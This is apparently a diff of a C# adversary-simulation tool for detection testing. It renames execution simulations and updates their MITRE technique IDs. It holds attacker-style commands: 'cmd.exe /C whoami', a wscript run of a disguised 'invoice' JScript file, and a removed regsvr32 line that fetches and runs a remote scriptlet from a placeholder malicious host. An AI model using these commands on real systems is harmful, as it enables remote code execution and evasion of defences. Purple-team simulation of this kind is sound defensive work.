@@ -10,7 +10,7 @@ namespace PurpleSharp.Simulations
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationHeader("T1086");
+            logger.SimulationHeader("T1059.001");
             logger.TimestampInfo("Using the command line to execute the technique");
             try
             {
@@ -29,7 +29,7 @@ namespace PurpleSharp.Simulations
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationHeader("T1086");
+            logger.SimulationHeader("T1059.001");
             logger.TimestampInfo("Using the System.Management.Automation .NET namespace to execute the technique");
             try
             {
@@ -49,11 +49,11 @@ namespace PurpleSharp.Simulations
 
         }
 
-        static public void ExecuteCmd(string log)
+        static public void WindowsCommandShell(string log)
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationHeader("T1059");
+            logger.SimulationHeader("T1059.003");
             try
             {
                 ExecutionHelper.StartProcess("", "cmd.exe /C whoami", logger);
@@ -85,11 +85,11 @@ namespace PurpleSharp.Simulations
 
         }
 
-        static public void Scripting(string log)
+        static public void VisualBasic(string log)
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationHeader("T1064");
+            logger.SimulationHeader("T1059.005");
             
             try
             {
@@ -104,23 +104,23 @@ namespace PurpleSharp.Simulations
 
         }
 
-        static public void ExecuteRegsvr32(string log)
+        static public void JScript(string log)
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationHeader("T1117");
+            logger.SimulationHeader("T1059.007");
+
             try
             {
-                string url = @"http://malicious.domain:8080/payload.sct";
-                string dll = "scrobj.dll";
-                ExecutionHelper.StartProcess("", String.Format("regsvr32.exe /u /n /s /i:{0} {1}", url, dll), logger);
+                string file = "invoice0420.js";
+                ExecutionHelper.StartProcess("", String.Format("wscript.exe {0}", file), logger);
                 logger.SimulationFinished();
             }
-            catch(Exception ex)
+            catch (Exception ex)
             {
                 logger.SimulationFailed(ex);
             }
-            
+
         }
 
     }
